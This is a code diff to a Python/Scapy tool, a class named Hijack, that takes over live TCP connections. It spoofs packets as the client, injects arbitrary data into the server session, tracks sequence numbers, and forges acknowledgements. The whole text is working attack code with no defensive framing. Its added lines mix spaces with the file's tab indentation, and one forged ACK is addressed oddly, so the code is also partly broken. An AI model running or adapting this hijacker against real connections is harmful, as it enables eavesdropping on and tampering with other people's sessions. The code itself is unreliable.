@@ -15,6 +15,7 @@ class Hijack:
 
 		self.my_seq = 0
 		self.my_ack = 0
+        self.my_offset = 0
 		self.hijacked = False
 
 	def input_loop(self):
@@ -25,9 +26,11 @@ class Hijack:
 			if not self.hijacked:
 				continue
 
-			packet = IP(src=self.client_ip, dst=self.srv_ip) / TCP(sport=self.client_port, dport=self.srv_port, seq=self.my_seq, ack=self.my_ack, flags="PA") / inject_data
+            seq = self.my_seq + self.my_offset
+            self.my_offset += len(inject_data)
+			packet = IP(src=self.client_ip, dst=self.srv_ip) / TCP(sport=self.client_port, dport=self.srv_port, seq=seq, ack=self.my_ack, flags="PA") / inject_data
 			send(packet, iface=self.dev, verbose=False)
-			self.my_seq += len(inject_data)
+
 
 	def handle_packet(self, packet):
 		ip = packet.getlayer("IP")
@@ -58,12 +61,22 @@ class Hijack:
 
 					threading.Thread(target=self.input_loop, daemon=True).start()
 				else:
-					if tcp.seq == self.my_ack and payload_len > 0:
+					if payload_len > 0:
 						self.my_ack += payload_len
 						data = packet.getlayer("Raw").load if packet.haslayer("Raw") else b""
 						print("Received from server: " + data.decode())
 						ack_packet = IP(src=ip.dst, dst=ip.src) / TCP(sport=tcp.dport, dport=self.srv_port, seq=self.my_seq, ack=self.my_ack, flags="A")
 						send(ack_packet, iface=self.dev, verbose=False)
+
+            #The packet is from client to server
+            elif tcp.sport == self.client_port and ip.src == self.client_ip:
+                if payload_len > 0:
+                    self.my_seq += payload_len
+                    data = packet.getlayer("Raw").load if packet.haslayer("Raw") else b""
+                    print("Received from client: " + data.decode())
+                    ack_packet = IP(src=ip.dst, dst=ip.src) / TCP(sport=tcp.dport, dport=self.srv_port, seq=self.my_seq, ack=self.my_ack, flags="A")
+                    send(ack_packet, iface=self.dev, verbose=False)
+
 	def run(self):
 		if self.client_ip:
 			print("Hijacking TCP connections from %s to %s on port %d" % (self.client_ip, self.srv_ip, self.srv_port))
